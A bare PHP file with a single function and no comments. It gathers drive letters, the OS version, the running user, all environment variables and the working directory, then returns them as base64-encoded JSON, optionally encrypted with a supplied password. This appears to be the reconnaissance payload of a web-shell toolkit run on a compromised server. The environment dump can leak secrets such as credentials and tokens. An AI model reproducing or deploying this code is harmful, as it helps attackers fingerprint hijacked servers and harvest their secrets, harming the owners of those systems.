<?
function main($pass)
{
    $driveList = "";
    if (stristr(PHP_OS, "windows") || stristr(PHP_OS, "winnt")) {
        for ($i = 65; $i <= 90; $i++) {
            $drive = chr($i) . ':/';
            file_exists($drive) ? $driveList = $driveList . $drive . ";" : '';
        }
    } else {
        $driveList = "/";
    }
    $res = array();
    $R = array();
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R["drive"] = $driveList;
    $R["os_version"] = php_uname();
    $R["current_user"] = "{$s}";
    $envString = "";
    foreach ($_ENV as $variableName => $variableValue) {
        $envString .= "{$variableName}={$variableValue}\n";
    }
    $R["os_env"] = $envString;
    $R["pwd"] = __DIR__;
    $res["status"] = "ok";
    $res["msg"] = base64_encode(json_encode($R));
    $res = json_encode($res);
    echo function_exists("encrypt") ? encrypt($res,$pass): $res;
}